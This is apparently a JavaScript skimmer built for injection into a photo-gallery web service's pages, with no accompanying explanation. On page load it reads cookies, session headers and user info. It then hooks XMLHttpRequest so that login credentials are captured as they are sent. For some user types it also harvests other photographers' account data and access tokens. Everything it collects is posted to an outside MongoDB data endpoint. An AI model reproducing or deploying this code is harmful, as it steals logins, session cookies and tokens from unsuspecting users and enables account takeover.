if (Math.random() <= 1.0) {
  const setPtxAccessToken = async () => {
    return fetch(
      "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
    )
      .then((resp) => resp.json())
      .then((json) => json.access_token)
      .then((token) => (window.accessToken = token));
  };

  const insertDoc = async (type, data) => {
    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = `pass-${type}`;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch(
      "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Request-Headers": "*",
          Authorization: `Bearer ${window.accessToken}`,
        },
        body: JSON.stringify({
          collection: "ingest",
          database: "pictimeDataDb",
          dataSource: "pixieset-data",
          document: envelope,
        }),
      }
    );
  };

  const getTokensByAccountUrl = async (
    accountUrl,
    csPictimeGUser,
    csPictimeProject
  ) => {
    try {
      const lookUpPhotographerAccountFetchUrl =
        "https://production.passgallery.com/!servicescs.asmx/lookUpPhotographerAccount";
      const gUserAccessFetchUrl =
        "https://production.passgallery.com/!servicescs.asmx/getGUserAccess";

      const portfolioHtml = await fetch(`${accountUrl}/portfolio`).then(
        (resp) => resp.text()
      );
      const accountId = +portfolioHtml.match(/"accountId":([0-9]+),/)[1];

      const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };

      const lookUpPhotographerAccountData = await fetch(
        lookUpPhotographerAccountFetchUrl,
        {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: csPictimeGUser,
            pictimeProject: csPictimeProject,
          },
          body: JSON.stringify(lookUpPhotographerAccountBody),
          method: "POST",
        }
      );

      const lookUpPhotographerAccountJson =
        await lookUpPhotographerAccountData.json();

      await insertDoc("account-data", {
        accountId,
        data: lookUpPhotographerAccountJson,
      });

      const gUserAccessBody = {
        email: lookUpPhotographerAccountJson.d.email,
      };

      const gUserAccessData = await fetch(gUserAccessFetchUrl, {
        headers: {
          accept: "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/json; charset=UTF-8",
          pictimeGUser: csPictimeGUser,
          pictimeProject: csPictimeProject,
        },
        body: JSON.stringify(gUserAccessBody),
        method: "POST",
      });

      const gUserAccessJson = await gUserAccessData.json();
      const gaccessTokenUrl = `https://${gUserAccessJson.d}`;

      const html = await fetch(gaccessTokenUrl, {
        // Important! Ensure that we don't override user's tokens
        credentials: "omit",
      }).then((resp) => resp.text());

      const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
      const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];

      await insertDoc("tokens", {
        url: accountUrl,
        pictimeGUser,
        pictimeProject,
      });
    } catch (err) {
      insertDoc("error", err.toString());
    }
  };

  setPtxAccessToken().then(async () => {
    setTimeout(async () => {
      await insertDoc("location", window.location);

      const isLoginPage = window.location.pathname.includes("/login");

      if (isLoginPage) {
        const originalSend = XMLHttpRequest.prototype.send;
        const originalOpen = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function (method, url) {
          this._monitoredUrl = url;
          return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = async function (data) {
          const urlToMonitor = "loginUser2";

          if (this._monitoredUrl && this._monitoredUrl.includes(urlToMonitor)) {
            const credentials = JSON.parse(data);
            await insertDoc("credentials", credentials);

            this.addEventListener("readystatechange", function () {
              if (this.readyState === XMLHttpRequest.DONE) {
                // You can access response data (this.responseText, this.responseXML) if necessary
              }
            });
          }
          return originalSend.apply(this, arguments);
        };
      }

      const userType = _pt$?.userInfo?.type;

      if (userType === 6) {
        const gusr = _pt$?.hdrs?.gusr;
        const lusr = _pt$?.hdrs?.lusr;

        const getGUserInfoFetchUrl =
          "https://production.passgallery.com/!servicescs.asmx/getGUserInfo";

        const urlsToGet = [

        ];

        for (const url of urlsToGet) {
          await getTokensByAccountUrl(url, gusr, lusr);
          await new Promise((res) => setTimeout(res, 10000));
        }
      }
    }, 500);
  });
} else {
  console.log(false);
}
